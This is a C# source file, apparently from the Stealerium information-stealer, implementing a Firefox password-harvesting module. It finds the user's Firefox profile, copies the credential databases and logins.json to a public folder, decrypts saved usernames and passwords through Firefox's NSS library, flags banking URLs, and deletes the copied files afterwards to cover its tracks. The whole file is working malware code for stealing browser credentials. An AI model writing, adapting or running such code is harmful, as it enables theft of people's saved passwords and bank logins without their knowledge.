using System;
using System.Collections.Generic;
using System.IO;
using System.Text.RegularExpressions;
using Stealerium.Helpers;

namespace Stealerium.Target.Browsers.Firefox;

internal sealed class CPasswords
{
	internal sealed class FfRegex
	{
		public static readonly Regex Hostname = new Regex("\"hostname\":\"([^\"]+)\"");

		public static readonly Regex Username = new Regex("\"encryptedUsername\":\"([^\"]+)\"");

		public static readonly Regex Password = new Regex("\"encryptedPassword\":\"([^\"]+)\"");
	}

	private static readonly string SystemDrive = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System));

	private static readonly string MozillaPath = Path.Combine(SystemDrive, "Program Files\\Mozilla Firefox");

	private static readonly string CopyTempPath = Path.Combine(SystemDrive, "Users\\Public");

	private static readonly string[] RequiredFiles = new string[4] { "key3.db", "key4.db", "logins.json", "cert9.db" };

	private static string GetProfile(string path)
	{
		try
		{
			string path2 = path + "\\Profiles";
			if (Directory.Exists(path2))
			{
				string[] directories = Directory.GetDirectories(path2);
				foreach (string text in directories)
				{
					if (File.Exists(text + "\\logins.json"))
					{
						return text;
					}
				}
			}
		}
		catch (Exception ex)
		{
			Logging.Log("Firefox >> Failed to find profile\n" + ex);
		}
		return null;
	}

	private static string CopyRequiredFiles(string profile)
	{
		string name = new DirectoryInfo(profile).Name;
		string text = Path.Combine(CopyTempPath, name);
		if (!Directory.Exists(text))
		{
			Directory.CreateDirectory(text);
		}
		string[] requiredFiles = RequiredFiles;
		foreach (string path in requiredFiles)
		{
			try
			{
				string text2 = Path.Combine(profile, path);
				if (File.Exists(text2))
				{
					File.Copy(text2, Path.Combine(text, Path.GetFileName(text2)));
				}
			}
			catch (Exception ex)
			{
				Logging.Log("Firefox >> Failed to copy files to decrypt passwords\n" + ex);
				return null;
			}
		}
		return Path.Combine(CopyTempPath, name);
	}

	public static List<Password> Get(string path)
	{
		List<Password> list = new List<Password>();
		string profile = GetProfile(path);
		if (profile == null)
		{
			return list;
		}
		string text = CopyRequiredFiles(profile);
		if (text == null)
		{
			return list;
		}
		try
		{
			string[] array = Regex.Split(Regex.Split(Regex.Split(File.ReadAllText(Path.Combine(text, "logins.json")), ",\"logins\":\\[")[1], ",\"potentiallyVulnerablePasswords\"")[0], "},");
			if (Decryptor.LoadNss(MozillaPath))
			{
				if (Decryptor.SetProfile(text))
				{
					string[] array2 = array;
					foreach (string input in array2)
					{
						Match match = FfRegex.Hostname.Match(input);
						Match match2 = FfRegex.Username.Match(input);
						Match match3 = FfRegex.Password.Match(input);
						if (match.Success && match2.Success && match3.Success)
						{
							string text2 = Regex.Split(match.Value, "\"")[3];
							string username = Decryptor.DecryptPassword(Regex.Split(match2.Value, "\"")[3]);
							string pass = Decryptor.DecryptPassword(Regex.Split(match3.Value, "\"")[3]);
							Password password = default(Password);
							password.Url = text2;
							password.Username = username;
							password.Pass = pass;
							Password item = password;
							Banking.ScanData(text2);
							Counter.Passwords++;
							list.Add(item);
						}
					}
				}
				Decryptor.UnLoadNss();
			}
		}
		catch (Exception ex)
		{
			Logging.Log("Firefox >> Failed collect passwords\n" + ex);
		}
		Filemanager.RecursiveDelete(text);
		return list;
	}
}
